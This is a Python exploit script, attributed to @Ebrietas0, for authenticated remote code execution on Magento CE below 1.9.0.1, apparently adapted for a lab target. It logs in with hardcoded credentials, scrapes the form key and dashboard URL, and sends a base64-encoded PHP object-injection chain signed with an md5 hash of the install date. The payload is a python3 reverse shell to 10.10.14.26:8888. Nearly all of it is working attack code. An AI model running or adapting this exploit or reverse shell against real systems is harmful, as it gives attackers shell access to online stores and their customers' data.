#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import mechanize
import pdb

def usage():
    print ("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"")
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]
rce = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:6:\"system\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:'+ str(len(rce)) +':\"' + rce + '\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}'

# Setup the mechanize browser and options
br = mechanize.Browser()
br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
#br.form.new_control('text', 'login[passowrd]', {'value': password}) 
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password
#userone = br.find_control(name="login[username]", nr=0)
#userone.value = username
#pwone = br.find_control(name="login[password]", nr=0)
#pwone.value = password

br.method = "POST"
request = br.submit()
content = request.read()

#Convert bytes to a Python String
content1 = content.decode('utf-8')
url = re.search("ajaxBlockUrl = \'(.*)\'", content1)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content1)
key = key.group(1)

content1 = request.read()
content1 = content.decode('utf-8')

#modify the period
request = br.open(url + 'block/tab_orders/period/1y/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read().decode('utf-8'))
#pdb.set_trace()
tunnel = tunnel.group(1)

payload = payload.encode('utf-8')
payload = base64.b64encode(payload)
install_date = install_date.encode('utf-8')
gh = md5(payload + install_date).hexdigest
payload1 = payload.decode('utf-8')
gh1 = str(gh())
exploit = tunnel + '?ga=' + payload1 + '&h=' + gh1
#pdb.set_trace()

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print (e.read())